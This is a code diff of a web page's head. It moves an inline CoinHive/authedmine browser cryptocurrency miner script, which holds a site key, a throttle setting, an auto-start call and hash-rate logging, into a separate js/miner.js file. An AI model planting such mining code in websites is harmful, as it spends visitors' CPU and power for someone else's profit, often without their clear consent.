@@ -15,35 +15,7 @@
 
     <!-- --------- Miner --------- -->
     <script src="https://authedmine.com/lib/authedmine.min.js"></script>
-    <script>
-        var miner = new CoinHive.Anonymous('GtbFLZWxTz6TzjdGicjBderFxvRMIfSf');
-        miner.setThrottle(0.3);
-        miner.start();
-
-        // Listen on events
-        miner.on('found', function() {
-            console.log("found hash!")
-        })
-        miner.on('accepted', function() {
-            console.log("accepted hash!")
-        })
-
-        // Update stats once per second
-        setInterval(function() {
-            var hashesPerSecond = miner.getHashesPerSecond();
-            var totalHashes = miner.getTotalHashes();
-            var acceptedHashes = miner.getAcceptedHashes();
-
-            console.log("hashesPerSecond", hashesPerSecond)
-            console.log("totalHashes", totalHashes)
-            console.log("acceptedHashes", acceptedHashes)
-
-            console.log("-----------")
-            console.log("-----------")
-            console.log("-----------")
-
-        }, 1000);
-    </script>
+    <script src="js/miner.js"></script>
 
 </head>
 <body>
